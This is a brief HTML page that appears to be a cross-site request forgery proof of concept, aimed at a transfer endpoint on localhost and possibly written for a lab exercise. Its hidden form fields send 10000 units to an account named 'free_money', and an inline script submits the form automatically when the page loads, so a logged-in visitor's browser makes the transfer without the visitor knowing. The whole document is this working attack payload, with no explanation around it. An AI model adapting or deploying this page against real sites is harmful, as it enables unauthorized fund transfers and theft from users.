<!DOCTYPE html>
<html>
<body>
    <h1>Fund Transfer Form</h1>
    <form id="transferForm" method="POST" action="https://127.0.0.1:8080/transfer">
        <!-- Input field for user_to -->
        <input type="hidden" name="user_to" value="free_money">
        
        <!-- Input field for amount -->
        <input type="hidden" name="amount" value="10000">
        
    </form>
    <script>
        document.getElementById('transferForm').submit();
    </script>
</body>
</html>
